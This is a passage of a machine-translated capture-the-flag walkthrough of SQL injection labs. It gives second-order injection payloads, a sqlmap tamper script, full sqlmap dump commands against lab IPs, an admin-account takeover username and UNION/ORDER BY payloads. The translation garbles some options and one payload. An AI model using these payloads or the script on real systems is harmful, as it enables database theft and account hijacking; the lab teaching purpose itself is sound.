kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">即使使用了参数化查询，如果应用程序不清理恶意数据，服务器也会接受恶意数据并将其放入数据库中。不过，参数化查询会阻止输入指向SQL注入。由于应用程序可能接受恶意数据，所有查询都必须使用参数化查询，而不仅仅是直接接受用户输入的查询。</p><p id="98af" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">用户注册函数也利用参数化查询，所以当执行下面的查询时，只执行INSERT语句。它将接受任何恶意的输入，如果不清理它，就把它放在数据库中，但是参数化查询防止输入导致SQL注入。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="222a" class="lo lp iq mz b gy nd ne l nf ng">INSERT INTO users (username, password) VALUES (?, ?)</span></pre><p id="4571" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">但是，获取属于用户的所有笔记的查询不使用参数化查询。用户名被直接连接到查询中，这使得它容易受到SQL注入的攻击。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="6690" class="lo lp iq mz b gy nd ne l nf ng">SELECT title, note FROM notes WHERE username = '" + username + "'</span></pre><p id="a4a7" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这意味着，如果我们用一个恶意的名称注册一个用户，一切都会很好，直到用户导航到notes页面，不安全的查询试图为恶意用户获取数据。</p><p id="db73" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过使用以下名称创建用户:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="df58" class="lo lp iq mz b gy nd ne l nf ng">' union select 1,2'</span></pre><p id="4f6e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们应该能触发二次注射:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ql"><img src="../Images/5b0b8f765c7f10c43a6e7d69c41357a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:734/format:webp/0*lH_vA5KtV_IREIYX.png"/></div></figure><p id="6136" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用此用户名，应用程序执行以下查询:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="6d61" class="lo lp iq mz b gy nd ne l nf ng">SELECT title, note FROM notes WHERE username = '' union select 1,2''</span></pre><p id="812a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">然后在新用户的notes页面上，我们可以看到查询中的第一列是注释标题，第二列是注释本身:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qa"><img src="../Images/6c28d6617242c5d77607bfa1d302bdfe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*hglROo3W9wBkN9tC.png"/></div></div></figure><p id="cc50" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">有了这些知识，这就很容易被利用。例如，要从数据库中获取所有的表，我们可以创建一个名为:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="9f4e" class="lo lp iq mz b gy nd ne l nf ng">' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''</span></pre><p id="f56f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">要在密码中找到该标志，请注册一个用户名:</p><p id="9830" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">' union select 1，group _ concat(password from users '</p><p id="3c42" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用Sqlmap自动化开发</p><p id="d1e5" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">可以使用sqlmap来自动化这种攻击，但是使用sqlmap的标准攻击将会失败。注入发生在用户注册时，但是易受攻击的函数位于注释页面上。要让sqlmap利用此漏洞，它必须执行以下步骤:</p><ol class=""><li id="6bf6" class="pj pk iq ku b kv kw ky kz lb pl lf pm lj pn ln qm pp pq pr bi translated">注册一个恶意用户</li><li id="ef78" class="pj pk iq ku b kv ps ky pt lb pu lf pv lj pw ln qm pp pq pr bi translated">恶意用户登录</li><li id="13be" class="pj pk iq ku b kv ps ky pt lb pu lf pv lj pw ln qm pp pq pr bi translated">转到注释页面触发注射</li></ol><p id="0466" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过创建篡改脚本可以实现所有必要的步骤。Sqlmap支持篡改脚本，即用于篡改注入数据的脚本。使用篡改脚本，我们可以轻松地修改有效负载，例如，向它添加自定义编码。它还允许我们设置其他东西，比如cookies。</p><p id="2788" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">下面的篡改脚本中有两个自定义函数。第一个函数是<em class="oq"> create_account() </em>，它用sqlmap的有效负载作为名称，用‘ASD’作为密码注册一个用户。下一个定制函数是<em class="oq"> login() </em>，它以新创建的用户身份登录sqlmap并返回Flask会话cookie。<em class="oq"> tamper() </em>是脚本中的主要函数，它有<em class="oq">有效负载</em>和<em class="oq"> **kwargs </em>作为参数。<em class="oq"> **kwargs </em>保存诸如HTTP头之类的信息，我们需要将Flask会话cookie放在请求上，以允许sqlmap转到notes页面来触发SQL注入。<em class="oq"> tamper() </em>函数首先从<em class="oq"> kwargs </em>获取头，然后在应用程序上创建一个新用户，然后登录到应用程序并在HTTP头对象上设置Flask会话。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="a602" class="lo lp iq mz b gy nd ne l nf ng"><em class="oq">#!/usr/bin/python</em></span><span id="3060" class="lo lp iq mz b gy nh ne l nf ng">import requests</span><span id="9ee5" class="lo lp iq mz b gy nh ne l nf ng">from lib.core.enums import PRIORITY</span><span id="eefc" class="lo lp iq mz b gy nh ne l nf ng">__priority__ = PRIORITY.NORMAL</span><span id="8b4b" class="lo lp iq mz b gy nh ne l nf ng">address = "http://10.10.1.134:5000/challenge4"</span><span id="6933" class="lo lp iq mz b gy nh ne l nf ng">password = "asd"</span><span id="665e" class="lo lp iq mz b gy nh ne l nf ng">def <strong class="mz ir">dependencies</strong>():</span><span id="cc04" class="lo lp iq mz b gy nh ne l nf ng">pass</span><span id="21d7" class="lo lp iq mz b gy nh ne l nf ng">def <strong class="mz ir">create_account</strong>(payload):</span><span id="f361" class="lo lp iq mz b gy nh ne l nf ng">with requests.Session() as s:</span><span id="5e98" class="lo lp iq mz b gy nh ne l nf ng">data = {"username": payload, "password": password}</span><span id="9fed" class="lo lp iq mz b gy nh ne l nf ng">resp = s.post(f"{address}/signup", data=data)</span><span id="fd24" class="lo lp iq mz b gy nh ne l nf ng">def <strong class="mz ir">login</strong>(payload):</span><span id="97e3" class="lo lp iq mz b gy nh ne l nf ng">with requests.Session() as s:</span><span id="e0a7" class="lo lp iq mz b gy nh ne l nf ng">data = {"username": payload, "password": password}</span><span id="f76c" class="lo lp iq mz b gy nh ne l nf ng">resp = s.post(f"{address}/login", data=data)</span><span id="7e36" class="lo lp iq mz b gy nh ne l nf ng">sessid = s.cookies.get("session", None)</span><span id="f1f6" class="lo lp iq mz b gy nh ne l nf ng">return "session={}".format(sessid)</span><span id="a905" class="lo lp iq mz b gy nh ne l nf ng">def <strong class="mz ir">tamper</strong>(payload, **kwargs):</span><span id="16ac" class="lo lp iq mz b gy nh ne l nf ng">headers = kwargs.get("headers", {})</span><span id="85bb" class="lo lp iq mz b gy nh ne l nf ng">create_account(payload)</span><span id="c738" class="lo lp iq mz b gy nh ne l nf ng">headers["Cookie"] = login(payload)</span><span id="3b37" class="lo lp iq mz b gy nh ne l nf ng">return payload</span></pre><p id="4121" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">篡改脚本所在的文件夹也需要一个空的<em class="oq"> __init__。py </em>文件，以便sqlmap能够加载它。在使用篡改脚本启动sqlmap之前，更改脚本中的地址和密码变量。完成后，就可以使用以下命令利用该漏洞:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="651f" class="lo lp iq mz b gy nd ne l nf ng">sqlmap --tamper so-tamper.py --url <a class="ae kr" href="http://10.10.1.134:5000/challenge4/signup" rel="noopener ugc nofollow" target="_blank">http://10.10.1.134:5000/challenge4/signup</a>  --data "username=admin&amp;password=asd"</span><span id="4f75" class="lo lp iq mz b gy nh ne l nf ng">--second-url <a class="ae kr" href="http://10.10.1.134:5000/challenge4/notes" rel="noopener ugc nofollow" target="_blank">http://10.10.1.134:5000/challenge4/notes</a>  -p username --dbms sqlite --technique=U --no-cast</span><span id="43f5" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --tamper so-tamper.py - The tamper script</em></span><span id="d8c2" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --url - The URL of the injection point, which is /signup in this case</em></span><span id="fa7d" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --data - The POST data from the registraion form to /signup.</em></span><span id="e1a6" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq">#   Password must be the same as the password in the tamper script</em></span><span id="ffe0" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --second-url </em><a class="ae kr" href="http://10.10.1.134:5000/challenge4/notes" rel="noopener ugc nofollow" target="_blank"><em class="oq">http://10.10.1.134:5000/challenge4/notes</em></a><em class="oq"> - Visit this URL to check for results</em></span><span id="5673" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># -p username - The parameter to inject to</em></span><span id="a114" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --dbms sqlite - To speed things up</em></span><span id="0782" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --technique=U - The technique to use. [U]nion-based</em></span><span id="c663" class="lo lp iq mz b gy nh ne l nf ng"><em class="oq"># --no-cast - Turn off payload casting mechanism</em></span></pre><p id="c63f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果不使用<em class="oq"> —无转换</em>参数关闭有效负载转换机制，转储<em class="oq">用户</em>表可能会很困难。这里可以看到铸造和不铸造之间区别的一个例子:</p><h2 id="cce0" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated">—启用铸造时:</h2><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="6790" class="lo lp iq mz b gy nd ne l nf ng">admin' union <strong class="mz ir">all</strong> select <strong class="mz ir">min</strong>(cast(x'717a717071' as text)||coalesce(cast(sql as text),cast(x'20' as text)))||cast(x'716b786271' as text),null from sqlite_master where tbl_name=cast(x'7573657273' as text)-- daqo'-- 7573657273 is 'users' in <strong class="mz ir">ascii</strong></span></pre><h2 id="9ab1" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated">—无铸件:</h2><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="da87" class="lo lp iq mz b gy nd ne l nf ng">admin' union <strong class="mz ir">all</strong> select cast(x'717a6a7871' as text)||<strong class="mz ir">id</strong>||cast(x'6774697a7462' as text)||password||cast(x'6774697a7462' as text)||username||cast(x'7162706b71' as text),null from users-- ypfr'</span></pre><p id="1b3c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当sqlmap询问时，回答no以遵循302重定向，然后回答yes以继续进一步测试，如果它检测到一些WAF/IP。当被问及是否要在以后的请求中合并cookies时，回答no，说no以减少请求的数量。如下图所示，sqlmap能够找到漏洞，这使我们能够自动利用它。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qg"><img src="../Images/3c1b9d1fd5bcebef7ea5642aa9651b9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*f3Aid5CRrbbqIuHJ.png"/></div></div></figure><p id="106e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">然后可以通过转储<em class="oq"> users </em>表找到该标志:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="838c" class="lo lp iq mz b gy nd ne l nf ng">sqlmap --tamper tamper/so-tamper.py --url <a class="ae kr" href="http://10.10.1.134:5000/challenge4/signup" rel="noopener ugc nofollow" target="_blank">http://10.10.1.134:5000/challenge4/signup</a> --data "username=admin&amp;password=asd" --second-url <a class="ae kr" href="http://10.10.1.134:5000/challenge4/notes" rel="noopener ugc nofollow" target="_blank">http://10.10.1.134:5000/challenge4/notes</a> -p username --dbms=sqlite --technique=U --no-cast -T users --dump</span></pre><p id="f165" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">Sqlmap非常嘈杂，会增加很多试图利用这个应用程序的用户。因此，输出将被修整，可以看到下面的消息。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="cb16" class="lo lp iq mz b gy nd ne l nf ng">[WARNING] console output will be trimmed to last 256 rows due to large table size</span></pre><p id="8412" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">但是，所有数据都会保存并写入转储文件，如下图所示。读取转储文件的顶部以获取标志:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qn"><img src="../Images/1b797a9e3596fb1bbb295e1912cfb9fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*aX_RLf2u8LeT0a1S.png"/></div></div></figure><p id="dd3b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">注意:</strong>实时系统上的标志会有所不同。</p><h1 id="19a7" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">工作</h1><p id="9353" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">利用易受攻击的函数并检索标志。</p><p id="5e40" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这次挑战的旗帜是什么？</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qo"><img src="../Images/f62ec8e8277cf9e3a99c7ee11f58ba0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1230/format:webp/1*js1dQaO2dxOFPYehQrt-vw.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qp"><img src="../Images/e4fcf8070aca96e372c7e7a7048fb930.png" data-original-src="https://miro.medium.com/v2/resize:fit:606/format:webp/1*Y6oixkub18hU5jxbJAJnEg.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qq"><img src="../Images/6c87f22d7cc0f4ded1c07370a73a0ee7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x2cI9qTHZkdh-dfQITuzyw.png"/></div></div></figure><p id="8d42" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">最后增加“<strong class="ku ir"> -T用户—转储</strong>”</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="3869" class="lo lp iq mz b gy nd ne l nf ng">sqlmap --tamper so-tamper.py --url <a class="ae kr" href="http://10.10.224.106:5000/challenge4/signup" rel="noopener ugc nofollow" target="_blank">http://10.10.224.106:5000/challenge4/signup</a> --data "username=admin&amp;password=asd" --second-url <a class="ae kr" href="http://10.10.224.106:5000/challenge4/notes" rel="noopener ugc nofollow" target="_blank">http://10.10.224.106:5000/challenge4/notes</a> -p username --dbms=sqlite --technique=U --no-cast <strong class="mz ir">-T users --dump</strong></span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qr"><img src="../Images/87fb5c2bf0f2037771c1dbb91319b5d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h6EhqVxOYnbVB64g9b-QgA.png"/></div></div></figure><h1 id="46c7" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务8:易受攻击的启动:更改密码</h1><h1 id="1fff" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">目标</h1><p id="ce36" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">对于此挑战，注释页面上的漏洞已被修复。新的更改密码功能已经添加到应用程序中，因此用户现在可以通过导航到配置文件页面来更改他们的密码。新函数容易受到SQL注入攻击，因为UPDATE语句将用户名直接连接到SQL查询中，如下所示。这里的目标是利用易受攻击的功能来获取管理员帐户的访问权限。</p><h1 id="408b" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">描述</h1><p id="ee3a" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">开发人员为密码参数使用了一个占位符，因为该输入直接来自用户。用户名不是直接来自用户，而是根据存储在会话对象中的用户id从数据库中获取。因此，开发人员认为使用用户名是安全的，并将其直接连接到查询中，而不是使用占位符:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="0ce2" class="lo lp iq mz b gy nd ne l nf ng">UPDATE users SET password = ? WHERE username = '" + username + "'</span></pre><p id="0e77" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">为了利用这个漏洞并获得管理员用户帐户的访问权限，我们可以创建一个名为<code class="fe qs qt qu mz b">admin'-- -</code>的用户。</p><p id="52c9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">注册恶意用户后，我们可以更新新用户的密码来触发漏洞。更改密码时，应用程序执行两个查询。首先，它向数据库询问我们当前用户的用户名和密码:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="065d" class="lo lp iq mz b gy nd ne l nf ng">SELECT username, password FROM users WHERE <strong class="mz ir">id</strong> = ?</span></pre><p id="7647" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果所有检查都没问题，它将尝试为我们的用户更新密码。因为用户名直接连接到SQL查询中，所以执行的查询将如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="f88e" class="lo lp iq mz b gy nd ne l nf ng">UPDATE users SET password = ? WHERE username = 'admin' -- -'</span></pre><p id="c424" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这意味着应用程序没有更新<code class="fe qs qt qu mz b">admin' -- -</code>的密码，而是更新了<em class="oq">管理员</em>的密码。更新密码后，可以使用新密码以管理员身份登录并查看标志。</p><h1 id="6829" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">工作</h1><p id="c9bc" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">创建一个新用户并利用更新密码功能中的漏洞来访问admin帐户以获取标志。</p><p id="3add" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们用<strong class="ku ir">管理员创建新用户—:ASD</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qv"><img src="../Images/c8669053b1a0467291bb3b34d4094a03.png" data-original-src="https://miro.medium.com/v2/resize:fit:698/format:webp/1*BwOjPo3cjFhdkTXWb1cTWA.png"/></div></figure><p id="cb78" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在登录到用户<strong class="ku ir">admin’—:ASD</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qw"><img src="../Images/1d757adb71356e69d61ff3a747a398c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:674/format:webp/1*y_BJyA7l3X5IHLWNzRicAQ.png"/></div></figure><p id="2971" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">登录后，转到个人资料页面，并通过此查询更改密码</p><p id="d072" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">旧密码= <strong class="ku ir"> asd </strong></p><p id="8966" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">新密码= <strong class="ku ir">通过</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qx"><img src="../Images/dda158417984396763860527bdb6a2c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R1OVaTC2Qa_BOSTcr2x7Ew.png"/></div></div></figure><p id="e2ce" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">是，密码已更改，现在以管理员身份登录<strong class="ku ir">管理员:通过</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qy"><img src="../Images/b24da36552d06c6c2101e5bffb27db0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:712/format:webp/1*lx6P49OzPCxBQwGC4mhXpQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qz"><img src="../Images/a96d3bd56d311ae38f1a0d726a0d11bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/format:webp/1*RRY71kTYimlt2mPz-lwu8A.png"/></div></figure><p id="21a8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">嘣！我们有旗子</p><h1 id="c222" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务9:易受攻击的启动:书名</h1><h1 id="d22e" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">目标</h1><p id="bdd8" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">该页面增加了一个新功能，现在可以在数据库中搜索书籍。新的搜索函数易受SQL注入攻击，因为它将用户输入直接连接到SQL语句中。任务的目标是利用这个漏洞找到隐藏的标志。</p><h1 id="508c" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">描述</h1><p id="0507" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">当用户首次登录挑战时，会出现一条消息，提示他们:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="24a8" class="lo lp iq mz b gy nd ne l nf ng">Testing a new function to search for books, check it out here</span></pre><p id="976e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">“此处”文本是一个链接，将用户带到<a class="ae kr" href="http://10.10.141.207/challenge6/book?title=test" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 141 . 207/challenge 6/book？title=test </a>，这是包含易受攻击的搜索功能的页面，可以在此处看到:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ra"><img src="../Images/4df09af52600e40ca510826ca5b60945.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*oqECeJ7-h2Ar13Tc.png"/></div></div></figure><p id="8f90" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当搜索一本书时，web页面执行带有参数<code class="fe qs qt qu mz b">title</code>的GET请求。它执行的查询如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="73ed" class="lo lp iq mz b gy nd ne l nf ng">SELECT * from books WHERE <strong class="mz ir">id</strong> = (SELECT <strong class="mz ir">id</strong> FROM books WHERE title like '" + title + "%')</span></pre><p id="49ec" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们需要做的就是在LIKE操作符的右边关闭LIKE操作数。例如，我们可以通过注入以下命令来转储数据库中的所有书籍:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="c39a" class="lo lp iq mz b gy nd ne l nf ng">') or 1=1-- -</span></pre><h1 id="ffad" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">工作</h1><p id="7756" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">使用你所知道的关于SQL注入联盟的知识，利用易受攻击的图书搜索功能来检索旗帜。</p><p id="572c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">创建新用户<strong class="ku ir"> sam2:asd </strong></p><p id="572e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">并登录帐户</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rb"><img src="../Images/d8d625afda29aebb090d1260b91bb1b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L39hS6vSU9dAC1O9EfcZXw.png"/></div></div></figure><p id="befa" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们可以通过注入以下命令来转储数据库中的所有书籍:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="ba1f" class="lo lp iq mz b gy nd ne l nf ng">') or 1=1-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi rc"><img src="../Images/cfa5c5e5ae0a0da02c7bd3a78793e4ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1202/format:webp/1*O-pZkdJW80JGm5Iv03IaAQ.png"/></div></div></figure><p id="99e0" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在事先不知道列数的情况下，攻击者必须首先通过系统地注入具有不同列数的查询来枚举列数，直到显示错误。例如:</p><p id="3c4b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">尝试每一个有效载荷</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="79e2" class="lo lp iq mz b gy nd ne l nf ng">') order by 1-- -<br/>') order by 2-- -<br/>') order by 3-- -<br/>') order by 4-- -<br/>') order by 5-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi rd"><img src="../Images/383b1816929ba7f1a2e9ceaf36ccb52b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/1*BgF2TepSkKUDjy9ImOFXIQ.png"/></div></figure><p id="5e1b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当我尝试的时候</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="b55d" class="lo lp iq mz b gy nd ne l nf ng">') order by 5-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi re"><img src="../Images/3184f452825339e177b3000f00bbcf77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*JhH8EKg-1WucPYAr7ByVBg.png"/></div></figure><p id="6fed" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi 